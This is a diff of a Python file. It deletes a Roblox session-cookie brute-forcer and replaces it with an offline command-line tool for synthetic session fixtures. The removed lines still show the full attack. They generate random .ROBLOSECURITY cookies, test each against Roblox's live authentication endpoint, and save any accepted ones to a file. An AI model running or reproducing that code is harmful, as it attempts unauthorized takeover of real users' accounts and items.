@@ -1,83 +1,83 @@
-import subprocess
-try:
-    import string
-    import random
-    import asyncio
-    from aiohttp import ClientSession
-    from aiofiles import open as aioopen
-    import sys
-except:
-    subprocess.call("pip install aiofiles", shell=True)
-    subprocess.call("pip install aiohttp", shell=True)
-    subprocess.call("pip install asyncio", shell=True)
-    import string
-    import random
-    import asyncio
-    from aiohttp import ClientSession
-    from aiofiles import open as aioopen
-    import sys
+"""Command-line interface for offline session fixtures."""
+
+import argparse
+import json
+import sys
+from pathlib import Path
+
+from session_fixtures import MAX_CASES, check_cookie, generate_fixtures, verify_fixtures
 
 
+MAX_INPUT_BYTES = 4 * 1024 * 1024
 
-cookies = []
-invalid_cookies = []
-intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
-n = 0
-v = input("What is your desired amount of cookies (higher cookies generated will increase odds of generating valid cookies.")
-c = int(v)
-letters = 'ABCDEF'
-print("""______                _              _   _   _           
-| ___ \              | |            | | | | | |          
-| |_/ /  ___    ___  | |_   ___   __| | | | | | _ __     
-| ___ \ / _ \  / _ \ | __| / _ \ / _` | | | | || '_ \    
-| |_/ /| (_) || (_) || |_ |  __/| (_| | | |_| || |_) | _ 
-\____/  \___/  \___/  \__| \___| \__,_|  \___/ | .__/ (_)
-                                               | |       
-                                               |_| """)
 
-invalid_count = 0
+def read_fixtures(filename: str) -> object:
+    if filename == "-":
+        content = sys.stdin.buffer.read(MAX_INPUT_BYTES + 1)
+    else:
+        with Path(filename).open("rb") as stream:
+            content = stream.read(MAX_INPUT_BYTES + 1)
 
-async def generate_cookie():
-    global invalid_count
-    cookie =  intro +  ''.join(random.choices(letters + string.digits, k=732))
-    async with ClientSession() as session:
-        async with session.get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie}) as response:
-            text = await response.text()
-            if '"id":' in text:
-                print(cookie)
-                cookies.append(cookie)
-                await write_cookies()
-                sys.exit()
-            else:
-                invalid_count += 1
-                invalid_cookies.append(cookie)
-                print("\rInvalid cookies: {}".format(invalid_count), end="")
+    if len(content) > MAX_INPUT_BYTES:
+        raise ValueError("Fixture JSON must be at most 4 MiB.")
+    return json.loads(content.decode("utf-8"))
 
-async def write_cookies():
-    async with aioopen("cookies.txt", "w") as n:
-        for i in cookies:
-            var = f"{i}"
-            await n.write(var)
-            await n.write(" ")
-    async with aioopen("invalid_cookies.txt", "w") as r:
-        for i in invalid_cookies:
-            var = f"{i}"
-            await r.write(var)
-            await r.write(" ")
 
-async def main():
-    global invalid_count
-    while True:
-        tasks = [asyncio.create_task(generate_cookie()) for i in range(c)]
-        await asyncio.gather(*tasks)
-        await write_cookies()
-        if invalid_count == c:
-            print("\nNone of the cookies were valid, retrying in 3 seconds")
-            await asyncio.sleep(3)
-            invalid_count = 0
-        else:
-            print('\n[!] Done!')
-            break
+def main(argv: list[str] | None = None) -> int:
+    parser = argparse.ArgumentParser(
+        description="Generate and verify synthetic session fixtures offline."
+    )
+    commands = parser.add_subparsers(dest="command")
 
-asyncio.run(main())
-input("\nPress enter to exit.\n")
+    generate = commands.add_parser("generate", help="Write active session fixtures to stdout")
+    generate.add_argument(
+        "--count", type=int, default=12, help=f"case count from 1 to {MAX_CASES:,} (default 12)"
+    )
+    generate.add_argument("--seed", type=int, help="integer seed for repeatable fixtures")
+    generate.add_argument(
+        "--all-outcomes", action="store_true", help="cycle through all six fixture outcomes"
+    )
+
+    verify = commands.add_parser("verify", help="Check the expected outcomes in fixture JSON")
+    verify.add_argument(
+        "file", nargs="?", default="-", help="path to fixture JSON (default stdin)"
+    )
+
+    check = commands.add_parser("check", help="Resolve one synthetic cookie in the fixture store")
+    check.add_argument("file", help="path to fixture JSON (use - for stdin)")
+    check.add_argument("--cookie-header", help="fixture Cookie header value (omit for missing)")
+
+    args = parser.parse_args(argv)
+    if args.command is None:
+        parser.print_help()
+        return 0
+
+    try:
+        if args.command == "generate":
+            fixtures = generate_fixtures(args.count, args.seed, all_outcomes=args.all_outcomes)
+            print(json.dumps(fixtures, indent=2))
+            return 0
+
+        fixtures = read_fixtures(args.file)
+        if args.command == "check":
+            outcome, account_id = check_cookie(fixtures, args.cookie_header)
+            print(json.dumps({"outcome": outcome, "account_id": account_id}))
+            return 0
+
+        total, mismatches = verify_fixtures(fixtures)
+    except (OSError, ValueError, RecursionError) as error:
+        print(error, file=sys.stderr)
+        return 2
+
+    if mismatches:
+        for mismatch in mismatches[:10]:
+            print(mismatch, file=sys.stderr)
+        print(f"{len(mismatches)} of {total} fixture cases failed.", file=sys.stderr)
+        return 1
+
+    print(f"Verified {total} fixture cases.")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
